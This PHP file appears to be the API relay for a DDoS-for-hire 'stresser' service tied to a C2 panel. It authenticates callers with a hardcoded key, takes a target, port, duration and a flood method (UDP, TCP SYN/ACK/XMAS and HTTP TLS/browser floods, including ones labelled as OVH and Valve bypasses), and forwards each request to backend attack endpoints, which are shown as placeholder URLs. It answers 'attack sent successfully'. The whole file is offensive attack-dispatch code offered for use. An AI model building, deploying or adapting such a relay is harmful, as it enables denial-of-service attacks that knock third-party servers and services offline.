<?php

//by Zile

header("Content-type: application/json");

$valid_keys = array(
	"Mk4f5OZ9ILElpcUWRTC5Yo68vG3kXa33", //C2 (admin.go - 762 line)
	"add_new",
	"add_new",
	"add_new",
	"add_new"
);

if (!isset($_SERVER['HTTP_PANDA_KEY'])) {
	$message = array('status' => 'error', 'message' => "api key is required");
	die(json_encode($message));
}

$get_key = $_SERVER['HTTP_PANDA_KEY'];

if (!in_array($get_key, $valid_keys)) {
	$message = array('status' => 'error', 'message' => "invalid api key");
	die(json_encode($message));
}

if (!isset($_GET["target"])) {
	$message = array('status' => 'error', 'message' => "target is required");
	die(json_encode($message));
}

if (!isset($_GET["duration"])) {
	$message = array('status' => 'error', 'message' => "duration is required");
	die(json_encode($message));
}

if (!isset($_GET["method"])) {
	$message = array('status' => 'error', 'message' => "method is required");
	die(json_encode($message));
}

if (!isset($_GET["method_type"])) {
	$message = array('status' => 'error', 'message' => "method_type is required");
	die(json_encode($message));
}

if (!isset($_GET["port"])) {
	$message = array('status' => 'error', 'message' => "port is required");
	die(json_encode($message));
}

if (!is_numeric($_GET["port"]) || !is_numeric($_GET["duration"])) 
{
	$message = array('status' => 'error', 'message' => "port and duration is only numeric");
	die(json_encode($message));
}

switch ($_GET["method"]) {
	case "udp":
		switch ($_GET["method_type"]) {
			case "BYPASS":
				sendAPI("http://example.api");
				break;
			case "OVH":
				sendAPI("http://example.api");
				break;
			case "STORM":
				sendAPI("http://example.api");
				break;
			case "VALVE":
				sendAPI("http://example.api");
				break;
			default:
				$message = array('status' => 'error', 'message' => "invalid method_type");
				die(json_encode($message));
				break;
		}
		break;
	case "tcp":
		switch ($_GET["method_type"]) {
			case "BYPASS":
				sendAPI("http://example.api");
				break;
			case "OVH":
				sendAPI("http://example.api");
				break;
			case "XMAS":
				sendAPI("http://example.api");
				break;
			case "ACK":
				sendAPI("http://example.api");
				break;
			case "SYN":
				sendAPI("http://example.api");
				break;
			case "HANDSHAKE":
				sendAPI("http://example.api");
				break;
			default:
				$message = array('status' => 'error', 'message' => "invalid method_type");
				die(json_encode($message));
				break;
		}
		break;
	case "http":
		switch ($_GET["method_type"]) {
			case "TLS":
				sendAPI("http://example.api");
				break;
			case "BROWSER":
				sendAPI("http://example.api");
				break;
			case "RAW":
				sendAPI("http://example.api");
				break;
			case "PPS":
				sendAPI("http://example.api");
				break;			
			default:
				$message = array('status' => 'error', 'message' => "invalid method_type");
				die(json_encode($message));
				break;
		}
		break;
	default:
		$message = array('status' => 'error', 'message' => "invalid method");
		die(json_encode($message));
		break;
}

$message = array('status' => 'success', 'message' => "attack sent successfully", 'method' => $_GET["method"], 'method_type' => $_GET["method_type"], 'target' => $_GET["target"], 'port' => $_GET["port"], 'duration' => $_GET["duration"]);
die(json_encode($message));

function sendAPI($url) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_NOBODY, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_exec($ch);
	curl_close($ch);
}
?>